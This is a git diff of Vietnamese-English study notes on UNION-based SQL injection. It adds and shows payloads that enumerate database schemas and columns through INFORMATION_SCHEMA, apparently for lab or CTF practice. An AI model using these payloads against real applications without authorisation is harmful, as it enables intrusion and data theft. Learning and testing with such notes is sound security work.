@@ -5,7 +5,7 @@
 
 ## Database 
 ```sql
-SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+cn' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
 - Columns **SCHEMA_NAME** chứa all tên của database hiện tại
@@ -34,7 +34,7 @@ cn' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS wher
 
 - Columns **COLUMN_NAME* chứa all tên của columns hiện tại trên table 
 - Table **INFORMATION_SCHEMA.COLUMNS** siêu dữ liệu chứa all column trong table
-- table_name='devss' ví dụ ta có tên csdl ta lấy được tên table là devs và truy vấn all các columns trên tables devss đó 
+- table_name='devss' ví dụ ta lấy được tên table là devss và truy vấn all các columns trên tables devss đó thông qua metadata column 
 
 ## DATA
 ```sql
